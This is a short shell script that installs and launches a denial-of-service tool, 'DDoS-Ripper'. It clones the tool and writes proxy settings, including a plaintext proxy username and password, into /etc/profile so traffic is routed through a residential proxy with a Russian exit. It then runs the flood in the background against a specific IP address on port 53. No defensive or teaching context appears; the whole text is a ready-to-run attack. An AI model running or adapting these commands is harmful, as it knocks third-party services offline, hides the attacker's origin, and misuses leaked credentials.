yum install git python3 -y
git clone https://github.com/palahsu/DDoS-Ripper.git
cd DDoS-Ripper

sudo echo "
PROXY_URL=\"http://cpabro:X7LDM16xDiqxA3PN_country-Russia@proxy.packetstream.io:31112/\"

export http_proxy=\"\$PROXY_URL\"
export https_proxy=\"\$PROXY_URL\"
export ftp_proxy=\"\$PROXY_URL\"
export no_proxy=\"127.0.0.1,localhost\"

# For curl
export HTTP_PROXY=\"\$PROXY_URL\"
export HTTPS_PROXY=\"\$PROXY_URL\"
export FTP_PROXY=\"\$PROXY_URL\"
export NO_PROXY=\"127.0.0.1,localhost\"
" >> /etc/profile

nohup python3 DRipper.py -s 194.54.14.186 -p 53 -t 135 -q &
